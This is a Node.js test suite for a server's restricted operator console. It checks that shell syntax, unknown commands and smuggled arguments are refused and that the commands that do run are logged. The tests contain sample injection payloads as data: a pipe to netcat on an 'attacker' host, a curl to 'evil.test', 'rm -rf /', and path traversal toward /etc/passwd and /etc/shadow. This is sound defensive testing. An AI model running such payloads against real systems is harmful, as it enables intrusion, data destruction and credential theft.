// The Server console. It looks like a terminal and is not one, and these tests
// are about that difference: a line is parsed against a fixed grammar, so the
// classic shell payloads are not "escaped", they are simply not commands.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import os from 'node:os';
import { createHmac } from 'node:crypto';
import { buildServer } from '../dist/server.js';
import { closeQueues } from '../dist/lib/queue.js';
import { db, disconnectDb } from '../dist/lib/db.js';
import { CONSOLE_COMMANDS, hostConsoleService } from '../dist/services/hostConsole.service.js';

const SECRET = process.env.JWT_SECRET ?? '';
function jwt() {
  const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
  const n = Math.floor(Date.now() / 1000);
  const d = `${b64({ alg: 'HS256', typ: 'JWT' })}.${b64({ sub: 'console-test', role: 'admin', iat: n, exp: n + 3600 })}`;
  return `${d}.${createHmac('sha256', SECRET).update(d).digest('base64url')}`;
}
const auth = () => ({ authorization: `Bearer ${jwt()}` });

let app;

before(async () => {
  app = await buildServer();
});

after(async () => {
  await db.hostActionLog.deleteMany({ where: { actionId: { startsWith: 'console:' } } }).catch(() => {});
  await app.close();
  await closeQueues();
  await disconnectDb();
});

test('every console command declares a usage line and a help line', () => {
  const seen = new Set();
  for (const c of CONSOLE_COMMANDS) {
    assert.ok(!seen.has(c.name), `duplicate command ${c.name}`);
    seen.add(c.name);
    assert.ok(c.usage.startsWith(c.name), `${c.name} usage starts with the command`);
    assert.ok(c.help.length > 0);
  }
});

test('AUDIT: shell syntax is refused by name, not escaped', async () => {
  for (const payload of [
    'df; id',
    'df && whoami',
    'df | nc attacker 1234',
    'df `id`',
    'df $(id)',
    'df > /etc/passwd',
    'df\nid',
    'status nginx & curl evil.test',
  ]) {
    await assert.rejects(() => hostConsoleService.run(payload), /Shell syntax is not accepted/, payload);
  }
});

test('AUDIT: an unknown command names what IS allowed rather than just failing', async () => {
  await assert.rejects(() => hostConsoleService.run('rm -rf /'), (e) => {
    assert.match(e.message, /not a command here/);
    assert.match(e.message, /df/, 'the refusal lists real commands');
    return true;
  });
  await assert.rejects(() => hostConsoleService.run('sudo su'), /not a command here/);
  await assert.rejects(() => hostConsoleService.run('bash'), /not a command here/);
});

test('AUDIT: arguments are validated, so a path or unit cannot be smuggled in', async () => {
  // A service name is checked against a list — an arbitrary one never reaches
  // systemctl, where `--property` and friends live.
  await assert.rejects(() => hostConsoleService.run('status ../../etc/passwd'), /not a service this console knows/);
  await assert.rejects(() => hostConsoleService.run('status evil'), /not a service this console knows/);
  await assert.rejects(() => hostConsoleService.run('log /etc/shadow'), /Unknown log/);
  await assert.rejects(() => hostConsoleService.run('journal nginx 99999'), /whole number from 1 to 500/);
  await assert.rejects(() => hostConsoleService.run('deployed -1'), /whole number from 1 to 50/);
});

test('an empty or oversized line is refused before anything spawns', async () => {
  await assert.rejects(() => hostConsoleService.run('   '), /Nothing to run/);
  await assert.rejects(() => hostConsoleService.run(`df ${'a'.repeat(300)}`), /Too long/);
});

test('server-only commands refuse on a laptop and are marked unavailable', async () => {
  if (os.platform() === 'linux') return;
  await assert.rejects(() => hostConsoleService.run('journal nginx'), /needs a Linux server/);
  assert.ok(hostConsoleService.commands().some((c) => !c.available), 'the hint list marks them');
});

test('a real command runs, and the run is on the record', async () => {
  // `deployed` is git log — it works identically on the laptop and the VPS,
  // which makes it the one command that can prove the path here.
  const result = await hostConsoleService.run('deployed 3', 'console-test');
  assert.equal(result.ok, true, result.output);
  assert.match(result.command, /^git log --oneline -n3$/, 'the argv is what the grammar built, not what was typed');

  const row = await db.hostActionLog.findFirst({ where: { actionId: 'console:deployed' }, orderBy: { at: 'desc' } });
  assert.ok(row, 'logged');
  assert.equal(row.actorId, 'console-test');
});

test('the console needs an operator session', async () => {
  assert.equal((await app.inject({ method: 'GET', url: '/api/host/console' })).statusCode, 401);
  const run = await app.inject({ method: 'POST', url: '/api/host/console/run', payload: { line: 'df' } });
  assert.equal(run.statusCode, 401);
});

test('over HTTP: a refusal is a 400 that explains itself', async () => {
  const res = await app.inject({ method: 'POST', url: '/api/host/console/run', headers: auth(), payload: { line: 'df; id' } });
  assert.equal(res.statusCode, 400);
  assert.match(res.json().error.message, /Shell syntax/);

  const ok = await app.inject({ method: 'POST', url: '/api/host/console/run', headers: auth(), payload: { line: 'deployed 1' } });
  assert.equal(ok.statusCode, 200);
  assert.equal(ok.json().ok, true);
});
